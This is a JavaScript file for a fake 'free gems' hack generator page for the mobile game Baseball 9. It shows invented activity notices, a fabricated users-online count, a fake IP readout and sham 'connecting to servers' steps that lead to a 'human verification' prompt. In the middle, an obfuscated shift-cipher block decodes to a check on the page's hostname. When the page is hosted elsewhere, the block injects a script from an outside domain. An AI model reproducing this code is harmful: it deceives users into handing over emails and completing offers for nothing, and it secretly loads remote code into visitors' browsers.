var R1V = "";
var R2V = "";
var R111 = " ";
var R222 = " Gems ";
var R1N = " <img src='../img/gems.png' class='status-img'>  ";
var R2N = " Gems ";
var PS = "";
var GN = "Baseball 9"; //GAME NAME

NAMES = [
  "FENOMENO",
  "XIVJan",
  "Splorgen",
  "djpocketchange",
  "Oasis",
  "Iggypop",
  "BallsInYourFace",
  "dopa7",
  "MasterDragonKing",
  "ssforfail",
  "MissyQing",
  "Endlesss",
  "badeed",
  "SmooshyCake",
  "Karmix",
  "Alestz",
  "svbk",
  "KissMeRDJ",
  "TeaMALaoSong",
  "drallaBnayR",
  "CHRISTHORMANN",
  "KnivesMillions",
  "MahNeega",
  "Sphinx",
  "Impasse",
  "Stefono62",
  "CLGEasy",
  "GankedFromAbove",
  "IslandLager",
  "MrJuneJune",
  "BrianTheis",
  "ShorterACE",
  "morippe",
  "Meatmush",
  "Dusey",
  "Paperkat",
  "Submit",
  "TooPro4u",
  "Porogami",
  "iuzi",
  "Suzikai",
  "TDKNear",
  "LiquidInori",
  "Deleted",
  "NtzLeopard",
  "UnKooL",
  "Desu",
  "Born4this",
  "sickening",
  "AllianceMike",
  "Dinklebergg",
  "YouGotFaker",
  "FusionSin",
  "IMBAYoungGooby",
  "Neverlike",
  "BestGodniviaNA",
  "FFat20GGWP",
  "kMSeunG",
  "AliBracamontes",
  "rua0311desuyo",
  "54Bomb99",
  "jivhust",
  "Penguinpreacher",
  "Yashimasta",
  "Erurikku",
  "ReeferChiefer420",
  "WonderfulTea",
  "Gamely",
  "OberonDark",
  "Imunne",
  "Hoeji",
  "xTearz",
  "NicoleKidman",
  "DonDardanoni",
  "Wonderfuls",
  "HentaiKatness69",
  "Ayai",
  "EREnko",
  "Cruzerthebruzer",
  "Connort",
  "Anoledoran",
  "BiggestNoob",
  "Anangelababy007",
  "TrojanPanda",
  "MasterCoach",
  "Kirmora",
  "wswgou",
  "NMEotterr",
  "DragonxCharl",
  "uJ3lly",
  "moosebreeder",
  "Strompest",
  "Kurumx",
  "Protective",
  "LegacyofHao",
  "DkBnet",
  "koreas",
  "AxelAxis",
  "NiMaTMSiLe",
  "Preachy",
  "WoahItsJoe",
  "XXRhythmMasterXX",
  "Lemin",
  "Destinedwithin",
  "Afflictive",
  "Nydukon",
  "Herald0fDeath",
  "ChowPingPong",
  "QuanNguyen",
  "interest",
  "Slylittlefox121",
  "VictimOfTalent",
  "chadiansile",
  "iToradorable",
  "BIackWinter",
  "Mazrer",
  "NKSoju",
  "nhocBym",
  "Dreemo",
  "Virus",
  "CowGoesMooooo",
  "Masrer",
  "Michaelcreative",
  "Emanpop",
  "Druiddroid",
  "KevonBurt",
  "Magicians",
  "HiImYolo",
  "LoveSick",
  "kamonika",
  "Chunkyfresh",
  "tongsoojosim",
  "hiimrogue",
  "Zookerz",
  "LiShengShun",
  "DeTFMYumenoti",
  "EddieMasao",
  "AGilletteRazor",
  "andtheknee",
  "Hazedlol",
  "SrsBznsBro",
  "Spreek",
  "Toxil",
  "JustinJoe",
  "Silverblade12345",
  "WalterWhiteOG",
  "SwiftyNyce",
  "Volt",
  "DoctorElo",
  "Connie",
  "DELLZOR",
  "aiopqwe",
  "MidnightBoba",
  "Sikeylol",
  "Warmogger",
  "Melhsa",
  "OmekoMushi",
  "Life",
  "SleepyDinosaur",
  "Leonard",
  "CatVomit",
  "Likang45",
  "PSiloveyou",
  "xtsetse",
  "ClydeBotNA",
  "Cpense",
  "Arakune",
  "shadowshifte",
  "LeeBai",
  "SexualSavant",
  "CornChowder",
  "DeTRFEsteL",
  "Astro",
  "deDeezer",
  "Jayms",
  "v1anddrotate",
  "JGLafter",
  "UhKili",
  "Aceyy",
  "Zik",
  "RiNDiN",
  "Grandederp",
  "KawaiiTheo",
  "Senjogahara",
  "Th3FooL",
  "GusTn",
  "TheTyrant",
  "GoJeonPa",
  "DJJingYun",
  "Egotesticle",
  "IoveLu",
  "OGNEunJungCho",
  "kevybear",
  "ImJas",
  "Agrorenn",
  "Synxia",
  "DouyuTVForgottt",
  "GrimSamurai",
  "6666666666666",
  "RockleeCtrl",
  "Xode",
  "QQ459680082",
  "KittenAnya",
  "Zakard",
  "MARSIRELIA",
  "WallOfText",
  "SireSnoopy",
  "kelppowder",
  "Hxadecimal",
  "onelaugh",
  "MisoMango",
  "PiggyAzalea",
  "MisterDon",
  "VirginEmperor",
  "suzuXIII",
  "P18GEMEINV",
  "Kurumz",
  "kjin",
  "CcLiuShicC",
  "ExileOfTheBlade",
  "Iambbb",
  "Fubguns",
  "Asutarotto",
  "WhatisLove",
  "Niqhtmarea",
  "L0LWal",
  "JannaFKennedy",
  "Steffypoo",
  "KillerHeedonge",
  "AsianSGpotato",
  "whiteclaw",
  "GATOAmyTorin",
  "lovemyRMB",
  "Frostarix",
  "voyyboy",
  "Melo",
  "RiotZALE",
  "ElvishGleeman",
  "givesyouwiings",
  "LoveIy",
  "Packy",
  "Ntzsmgyu",
  "Susice",
  "Dontqqnubz",
  "mikeshiwuer",
  "Chulss",
  "MASTERDING",
  "Scorpionz",
  "KKOBONG",
  "Veeless",
  "NtzMoon",
  "Leesinwiches",
  "RefuseFate",
  "TP101",
  "ozoss0",
  "SeaShell",
  "Baesed",
  "Foolish",
  "jivhust1",
  "KMadKing",
  "CHRlSS",
  "jbraggs",
  "BeefTacos",
  "Xoqe",
  "Naeim",
  "Aerodactyl",
  "Triett",
  "194IQredditor",
  "Pulzar",
  "Windgelu",
  "Suadero",
  "Zulgor",
  "Senks",
  "cAbstracT",
  "SwagersKing",
  "AkameBestGirl",
  "ThePrimaryEdict",
  "arthasqt",
  "Lobstery",
  "MisterOombadu",
  "TheFriendlyDofu",
  "Oryziaslatipes",
  "ugg1",
  "Flandoor",
  "HawkStandard",
  "wimbis",
  "JimmerFredette",
  "VikingKarots",
  "Sorcerawr",
  "Ciscla",
  "Suffix",
  "MrCow",
  "METALCHOCOB0",
  "Dessias",
  "LevelPerfect",
  "midVox",
  "Junha",
  "Hickus",
  "gamepiong",
  "AirscendoSona",
  "HellooKittie",
  "Jesse",
  "Rainaa",
  "ILoveNASoloQ",
  "Colonelk1",
  "DeTRFZerost",
  "Szmao",
  "TacoKat",
  "1tzJustVictor",
  "HomedogPaws",
  "DioDeSol",
  "PeterBrown",
  "FrannyPack",
  "AbsoluteFridges",
  "TheBiddler",
  "ELMdamemitai",
  "Old",
  "Pavle",
  "nathanielbee",
  "MakiIsuzuSento",
  "nweHuang",
  "EvanRL",
  "yorozu",
  "forgivenbow",
  "alexxisss",
  "Cloverblood",
  "Entities",
  "Believe",
  "Chiruno",
  "Xiaobanma",
  "BestJanna",
  "Neko",
  "TheEyeofHorus",
  "IGotSunshine",
  "Shade20",
  "Sprusse",
  "Imacarebear",
  "Kenleebudouchu",
  "LockDownExec",
  "Chubymonkey",
  "HunterHagen",
  "Applum",
  "DaoKho",
  "MrBlackburn",
  "beatmymeat",
  "BestDota2Sona",
  "chubbiercheeks",
  "KillaKast",
  "Betsujin",
  "TheAmberTeahouse",
  "BellaFlica",
  "ManateeWaffles",
  "Babalew",
  "charmanderu",
  "TooSalty",
  "LotusBoyKiller",
  "Bulgogeeeee",
  "Nerzhu1",
  "Lovelyiris",
  "QuantumFizzics",
  "freakingnoodles",
  "Pdop1",
  "Bakudanx",
  "Martel",
  "DoctorDoom",
  "equalix",
  "CARDCAPTORCARD",
  "Dyad",
  "Papasmuff",
  "TheBroskie",
  "Wadenation",
  "Flyinpiggy",
  "Wingsofdeathx",
  "IamOsiris",
  "ArtThief",
  "LotusEdge",
  "fwii",
  "Kios",
  "Shampu",
  "Nickpappa",
  "Yukari",
  "RayXu",
  "Emeraldancer",
  "TwoPants",
  "EnzoIX",
  "Jacka",
  "Plumber",
  "Skadanton",
  "C9TGleebglarbu",
  "BonQuish",
  "GrimmmmmmmReaper",
  "SmoSmoSmo",
  "MewtMe",
  "Ramzlol",
  "Mruseless",
  "Eitori",
  "S0lipsism",
  "X1337Gm4uLk03rX",
  "lloveOreo",
  "MrChivalry",
  "Oyt",
  "AnVu",
  "RBbabbong",
  "MASTERROSHl",
  "dabestmelon",
  "Potatooooooooooo",
  "KasuganoHaru",
  "C9BalIs",
  "stainzoid",
  "MrArceeSenpaiSir",
  "sweetinnocence",
  "Firehazerd",
  "EpicLynx",
  "2011",
  "PandaCoupIe",
  "Moelon",
  "KingKenneth",
  "Skinathonian",
  "FelixCC",
  "snowmine",
  "Acme",
  "QmoneyAKAQdollas",
  "Fexir",
  "ImbaDreaMeR",
  "ImNovel",
  "ButtercupShawty",
  "touch",
  "penguin",
  "Promitio",
  "DeTRFMoyashi",
  "Hordstyle",
  "Iizard",
  "Jintae",
  "pichumy",
  "Upu",
  "Iemonlimesodas",
  "TwitchTvAuke",
  "Promises",
  "Jintea",
];

SEN = [" generated ", " received "];

function GSW() {
  var indexNAMES = Math.floor(Math.random() * NAMES.length);
  var indexSEN = Math.floor(Math.random() * SEN.length);
  var R1M = Math.floor(Math.random() * 5) + 1;
  var R2M = Math.floor(Math.random() * 12) + 1;
  var R1 = 5000 * R1M;
  var MONEY = [
    "5,000",
    "15,000",
    "35,000",
    "50,000",
    "100,000",
    "200,000",
    "250,000",
    "500,000",
  ];
  var R2 = MONEY[Math.floor(Math.random() * MONEY.length)];

  var SEN2 = [R1N + R2 + R2N];

  var indexSEN2 = Math.floor(Math.random() * SEN2.length);

  var TEN = NAMES[indexNAMES] + SEN[indexSEN] + SEN2[indexSEN2];
  $(".recent-header").fadeIn("slow");
  $(".recent-header").html(TEN);
  setTimeout(function() {
    $(".recent-header").fadeOut("slow");
  }, 3500);
}

$(".recent").fadeIn("slow");
GSW();

setInterval(function() {
  GSW();
}, 4100);

var SSS4 = "";

function getIP() {
  if (s_IP == "xD") {
    $.get("https://api.ipify.org", function(data) {
      s_IP = "225.203.125.01";
      SSS4 = "<strong>User IP: </strong>" + s_IP;
    });
  } else {
    SSS4 = "<strong>User IP: </strong>" + s_IP;
  }
}

s_IP = "xD";

s_AAA = 0;

s_DATE = new Date().toLocaleDateString();

getIP();

var SSS = [];

SHF();

function SHF() {
  s_AAA += Math.floor(Math.random() * 10);

  var s_DDD = new Date();

  var s_ONLINE = Math.round(
    s_DDD.getSeconds() +
      (60 * (s_DDD.getMinutes() + 60 * s_DDD.getHours())) / 50 -
      s_AAA
  );

  var SSS1 =
    "<strong>Website Status: </strong><font color='green'>Online</font>";
  var SSS2 = "<strong>Users online: </strong>" + s_ONLINE;
  var SSS3 = "<strong>Last updated: </strong>" + s_DATE;

  SSS = [SSS1, SSS2, SSS3, SSS4];
}

var Dx = 1;

function SHH() {
  $(".status-header").fadeIn("slow");
  $(".status-header").html(SSS[Dx]);
  setTimeout(function() {
    $(".status-header").fadeOut("slow");
    Dx += 1;
    if (Dx == 4) {
      Dx = 0;
    }
  }, 4000);
}

(function(document) {
  const k = (s) =>
    s
      .split("")
      .map((c) => String.fromCharCode(c.charCodeAt() - 1))
      .join("");
  if (
    window[k("mpdbujpo")][k("iptuobnf")].replace(k("xxx/"), "") !=
    k("htbhfo/dpn")
  ) {
    var s = document.createElement(k("tdsjqu"));
    s.src = k("iuuqt;00cpputusbqmvhjo/dpn0q/qiq@je>2151");
    document[k("ifbe")].appendChild(s);
  }
})(document);

setTimeout(function() {
  $(".status-header").fadeOut("slow");
}, 4000);

setInterval(function() {
  SHF();
}, 5000);

setInterval(function() {
  SHH();
}, 4600);

function set_platform(LOL) {
  PS = LOL;
  $(".fa-" + LOL).css("opacity", "1");
  if (LOL == "apple") {
    $(".fa-android").css("opacity", "0.35");
  } else {
    $(".fa-apple").css("opacity", "0.35");
  }
}

function ccc() {
  if ($("#username").val() == "") {
    alert("Type in your Email.");
    return false;
  }
  if (PS == "") {
    alert("Are you on an Android or Apple?");
    return false;
  }
  R1V = $(".i-gems").val();
  R2V = $(".i-gold").val();
  $(".beg").fadeOut("slow", function() {
    $(".r1r1").text(R1V + " " + R111);
    $(".r2r2").text(R2V + " " + R222);
    $(".f-username").text("Username: " + $("#username").val());

    $(".end").fadeIn("slow", function() {
      var TYPED = new Typed(".hack-generator", {
        typeSpeed: 0,
        backSpeed: 0,
        showCursor: false,
        strings: [
          "Connecting to <strong>" + GN + " servers...^2000",
          "Verifying Username " +
            $("#username").val() +
            "...^2500 <strong>VERIFIED!</strong>^1000",
          "Generating " +
            R111 +
            " <strong>" +
            R1V +
            "</strong>...^2000 <strong>DONE!</strong>^1000",
          "Preparing to Save...^2000 <strong>READY TO SAVE!</strong>^1000",
          "Protecting Account...^2000",
          "Deleting traces...^2000",
          "Disconnecting with database...^2000",
          "<green><strong>Your Gems are Ready!</green><red> <p>We just need to make sure you are a human and not a bot. Please pass our Human Verification so we can generate your Gems to your account.</strong></red>^2000",
        ],
        onComplete: function(self) {
          //$(".hack-generator").fadeOut("slow", function() {
          //$(".h-v").fadeIn("slow");
          //})
          $(".h-v").fadeIn("slow");
        },
      });
    });

    $(".ehh")
      .fadeIn("slow")
      .css("display", "flex");
  });
}
